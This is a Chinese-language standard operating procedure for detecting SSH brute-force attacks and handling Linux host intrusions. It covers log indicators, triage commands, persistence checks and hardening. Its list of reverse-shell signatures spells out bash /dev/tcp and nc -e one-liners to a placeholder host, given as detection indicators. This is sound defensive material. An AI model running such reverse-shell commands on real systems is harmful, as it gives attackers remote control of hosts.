# SSH 暴力破解检测与 Linux 主机应急响应 SOP

## 一、SSH 暴力破解（OWASP A07 认证失效）

### 1. 攻击特征
- 短时间内大量 `Failed password` / `authentication failure` 登录失败，来源集中在同一 IP。
- 尝试常见用户名：root、admin、test、oracle、ubuntu、postgres。
- 大量失败后出现一次 `Accepted password`，高度提示爆破得手。
- 本系统模拟场景：来源 IP 103.146.184.77，10 分钟内 217 次失败后 root 登录成功。

### 2. 相关日志位置（Linux）
- CentOS/RHEL：`/var/log/secure`
- Ubuntu/Debian：`/var/log/auth.log`
- 统计爆破源：
  `grep "Failed password" /var/log/secure | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr`
- 确认成功登录：
  `grep "Accepted" /var/log/secure`

### 3. 防御加固
- 禁止 root 直接登录（`PermitRootLogin no`），禁用密码登录改密钥登录（`PasswordAuthentication no`）。
- 使用强口令、fail2ban/denyhosts 自动封禁、防火墙限速 22 端口。
- SSH 不暴露公网，走堡垒机/VPN，限制来源 IP。
- 开启 MFA/双因素，最小化账号，启用登录审计告警。

## 二、Linux 入侵应急响应流程

### 1. 初判与止损
- 确认是否失陷：是否有异常成功登录、异常进程、异常外联。
- 止损：封禁攻击 IP（firewalld/iptables/安全组），必要时断网隔离；保留现场内存与日志。

### 2. 排查维度（按顺序）
1. **登录与账号**：`last`、`lastb`、`/var/log/secure`、`who`、`/etc/passwd`（UID 0 账号）、新增账号。
2. **进程**：`ps auxf`、`top`，关注反弹 shell、异常名字、高 CPU 挖矿进程。
3. **网络连接**：`ss -antp`、`netstat -antp`，定位异常外联（如 `IP:4444`）。
4. **后门持久化**：
   - 计划任务：`crontab -l`、`/etc/crontab`、`/etc/cron.d/`、`/var/spool/cron/`
   - 启动项：`/etc/rc.local`、systemd service
   - SSH 后门：`~/.ssh/authorized_keys`
   - 软链接/篡改命令：`alias`、`/usr/bin` 时间戳
5. **Web 层**：Web 目录最近修改文件（`find /var/www -mtime -1`），排查 WebShell。
6. **日志**：Web 访问日志、系统日志、历史命令 `~/.bash_history`。

### 3. 常见反弹 Shell 特征
- `bash -i >& /dev/tcp/IP/4444 0>&1`
- `nc -e /bin/sh IP 4444`
- python/perl 反弹脚本
- 出现连接到外网高端口的长连接，父进程为 www-data/apache。

### 4. 根除与恢复
- 清除后门、WebShell、异常账号、计划任务、SSH key。
- 修复入口（弱口令/上传漏洞/注入），更新补丁与加固基线。
- 从可信备份恢复，必要时重装系统；全量重置凭据。

### 5. 验证
- 观察 24-48 小时无复发；确认封禁生效、外联消失、告警解除。

## 三、研判结论要点
- 攻击是否成功：以「失败后是否出现 Accepted」「是否有后续 sudo/外联/落地文件」为准。
- 影响范围：是否提权、是否横向、是否窃取数据。
- 风险等级：root 失陷 + 反弹 shell + 持久化 = 严重。
